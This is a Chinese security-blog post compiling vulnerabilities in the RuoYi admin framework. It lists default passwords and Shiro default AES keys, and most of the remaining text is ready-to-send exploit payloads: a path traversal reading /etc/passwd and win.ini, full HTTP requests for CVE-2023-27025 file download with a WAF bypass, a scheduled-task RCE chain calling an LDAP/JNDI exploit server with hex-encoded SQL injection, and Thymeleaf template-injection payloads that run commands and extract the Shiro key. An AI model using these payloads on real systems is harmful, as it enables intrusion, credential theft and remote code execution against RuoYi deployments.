#  Ruoyi单应用版本漏洞合集  
安全艺术  安全艺术   2026-01-11 00:40  
  
若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。  
# 1. RuoYi 弱口令  
```
用户：admin ruoyi druid ry            密码：123456 admin druid admin123 admin888 admin@123
```  
# 2. RuoYi Shiro默认密钥  
```
# RuoYi 版本号对象版本的默认AES密钥# 4.6.1-4.3.1	zSyK5Kp6PZAAjlT+eeNMlg==#3.4-及以下	fCq+/xW488hMTCD+cmJ3aQ==
```  
# 3. RuoYi 后台SQL注入  
> RuoYi-4.6.0代码审计之SQL注入漏洞1  
  
> 安全艺术，公众号：安全艺术[RuoYi-4.6.0代码审计之SQL注入漏洞1](https://mp.weixin.qq.com/s/c5B5ZoxefiBiXe508mJUig)  
  
  
> RuoYi 后台SQL注入漏洞系列2  
  
> 安全艺术，公众号：安全艺术[RuoYi 后台SQL注入漏洞系列2](https://mp.weixin.qq.com/s/7fPL8gnvt4X0loaJ1qzPgA)  
  
  
  
# 4. RuoYi CNVD-2021-01931 后台任意文件下载  
  
RuoYi<4.5.1  
```
/common/download/resource?resource=/profile/../../../../etc/passwd/common/download/resource?resource=/profile/../../../../Windows/win.ini
```  
# 5. RuoYi CVE-2023-27025 后台任意文件下载  
  
**RuoYi<= 4.7.6**  
```
POST /monitor/job/add HTTP/1.1Host: 192.168.3.102Content-Length: 278Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestX-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.3.102Referer: http://192.168.3.102/tool/gen/createTableAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=0627cca5-d25b-4156-8f9e-b48eb4d0d1eaConnection: keep-alivecreateBy=admin&jobId=666&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('D:\@CodeAudit\Code\RuoYi\RuoYi-4.7.6\RuoYi-4.7.6\ruoyi-admin\src\main\resources\application-druid.yml')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaQ99pFoZTYJqhIhvmCpcysNjDtlrwUK6xGaYnHoLh5TJxqh3aTtIuMw/640?wx_fmt=png&from=appmsg "")  
```
POST /monitor/job/run HTTP/1.1Host: 192.168.3.102Content-Length: 9Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestX-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.3.102Referer: http://192.168.3.102/tool/gen/createTableAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=0627cca5-d25b-4156-8f9e-b48eb4d0d1eaConnection: keep-alivejobId=666
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaH5UN3ymtZIfznKDMSqiccXQ6SHkIqibbJiauicUY6Xy4uJTvkC3LMhqdlA/640?wx_fmt=png&from=appmsg "")  
  
清除日志  
```
POST /monitor/jobLog/clean HTTP/1.1Host: 192.168.3.102Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestX-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Origin: http://192.168.3.102Referer: http://192.168.3.102/tool/gen/createTableAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=0627cca5-d25b-4156-8f9e-b48eb4d0d1eaConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 0
```  
  
触发任意文件下载  
```
GET /common/download/resource?resource=1.txt HTTP/1.1Host: 192.168.3.102Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestX-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Origin: http://192.168.3.102Referer: http://192.168.3.102/tool/gen/createTableAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=0627cca5-d25b-4156-8f9e-b48eb4d0d1eaConnection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaTM6KjjMlibXLJYrAqAM9y2SxdymRn6H2sGoht5liauJPM2BfmVKWj7dw/640?wx_fmt=png&from=appmsg "")  
  
读win.ini  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaapxLaxBKdUicBvr445ibLa7qCnAtGAOx6yXQtxKLutGCvkaTWn6odCTA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaLKzzLFHibIXPwMDrbaEkDMu4ZxEUBfW2AQByc6hhzIIIMQXSibj2CWEg/640?wx_fmt=png&from=appmsg "")  
  
对路径参数进行 URL 编码或 Unicode 编码，绕过 WAF 检测：  
```
invokeTarget=ruoYiConfig.setProfile('%2F%65%74%63%2F%70%61%73%73%77%64')
```  
# 6. RuoYi 4.7.1-4.7.8后台定时任务RCE  
```
java -jar JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar -C calc -A 192.168.3.102
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaDjBCyjClpSm7utVibhn0uL4HFVxMAt95U97DtIKzhBadPgic6hjKm3dg/640?wx_fmt=png&from=appmsg "")  
```
javax.naming.InitialContext.lookup('ldap://192.168.3.102:1389/deserialJackson')
```  
  
将上述内容转换成16进制  
  
https://www.bejson.com/convert/ox2str/  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target=0x(16进制数据) WHERE job_id = 1;')
```  
  
新增定时任务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaqv4oJ8Ku4iaUBotdr3vtVlAm8ojvp2YANpB2Wzek62dTfttyiaINwhRQ/640?wx_fmt=png&from=appmsg "")  
  
调用目标字符串  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target=0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3139322e3136382e332e3130323a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')
```  
  
cron表达式：  
```
* * * * * ?
```  
  
执行一次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiavf3O0NNiaKuAtnA1jAsCIoeK98V4wKQyZDp42cIukUE8iatMSPmWWwiaQ/640?wx_fmt=png&from=appmsg "")  
  
该任务执行结束会向任务编号为1的任务写入目标字符串，执行这个任务1可触发RCE。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaEHiavZEqicHh5iauJkEiazfGmwgE1FRrEJW67Ewwn7ia7mTNcMMY41sqRDQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaVvTrPAptasp5ScbX9JX4UTzoXGrK3bDjR6Wzqln92QzvDVRW0k5mOg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaVon5d6keyLGu4pzpHMLOyb2wsYbgtTFWoGOwicyBT1xibWVVatsIWovA/640?wx_fmt=png&from=appmsg "")  
  
4.7.9加了白名单限制  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaGQjGMEMCK1W9ykQmWXoXzLHcaNhPfPrZw5BEanEaRcszkzPgVxXSaw/640?wx_fmt=png&from=appmsg "")  
# 7.  RuoYi 4.7.9-4.8.2后台存在SSTI漏洞(获取Shiro密钥)  
## 7.1. Thymeleaf模板注入  
```
POST /monitor/cache/getNames HTTP/1.1Host: 192.168.3.105Content-Length: 69Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.3.105Referer: http://192.168.3.105/system/dept/edit/103Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=e08dc9e6-5445-4016-8d01-ab20a00d7359Connection: keep-alivefragment=header((${T (java.lang.Runtime).getRuntime().exec("calc")}))
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaWDNjuDBOweCkohksPPFYABWHkI5rSBUfaEQnd0nq4R340ZfNG8AeRw/640?wx_fmt=png&from=appmsg "")  
```
POST /monitor/cache/getNames HTTP/1.1Host: 192.168.3.105Content-Length: 205Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.3.105Referer: http://192.168.3.105/system/dept/edit/103Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=e08dc9e6-5445-4016-8d01-ab20a00d7359Connection: keep-alivefragment=__|$${#response.getWriter().print(@securityManager.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaDSbT0UUbnYWqFAmBicaVkY5wxJw8icRXLueZttb390fYZUs86y4htyaw/640?wx_fmt=png&from=appmsg "")  
  
登录接口利用shiro的key直接R。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiaoicKV1VekWLib31k9vI5odGIZf17NcibSRlzKUwe12gTffzDicpAgbcPZQ/640?wx_fmt=png&from=appmsg "")  
  
其它接口，全局搜索。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OqGV96ZzTxicUCt4bRricmUCiabalYIHXJ7eQTY651MdSHyLfpKtfFefHL893r6ZgDE2KDUdyic578PrA/640?wx_fmt=png&from=appmsg "")  
```
/monitor/cache/getKeys/monitor/cache/getValue/demo/form/localrefresh/task
```  
```
POST /monitor/cache/getKeys HTTP/1.1Host: 192.168.3.102Content-Length: 229Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestX-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.3.102Referer: http://192.168.3.102/tool/gen/createTableAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=de6b9984-128c-417e-a91a-a106bc0cccb0Connection: keep-alivecacheName=1&cacheKeys=1&fragment=__|$${#response.getWriter().print(@securityManager.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x
```  
```
POST /monitor/cache/getValue HTTP/1.1Host: 192.168.3.102Content-Length: 241Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestX-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.3.102Referer: http://192.168.3.102/tool/gen/createTableAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=de6b9984-128c-417e-a91a-a106bc0cccb0Connection: keep-alivecacheName=1&cacheKey=1&cacheValue=1&fragment=__|$${#response.getWriter().print(@securityManager.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x
```  
```
POST /demo/form/localrefresh/task HTTP/1.1Host: 192.168.3.102Content-Length: 226Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestX-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.3.102Referer: http://192.168.3.102/tool/gen/createTableAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: JSESSIONID=de6b9984-128c-417e-a91a-a106bc0cccb0Connection: keep-alivename=1&type=1&date=1&fragment=__|$${#response.getWriter().print(@securityManager.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x
```  
  
更多内容欢迎进群了解。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp8rYHr0Gjyq1SQjWJic3nlkDj7ZouLJyAkH0ZKIOsOpDlduOv9ydLrFw/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=24 "")  
  
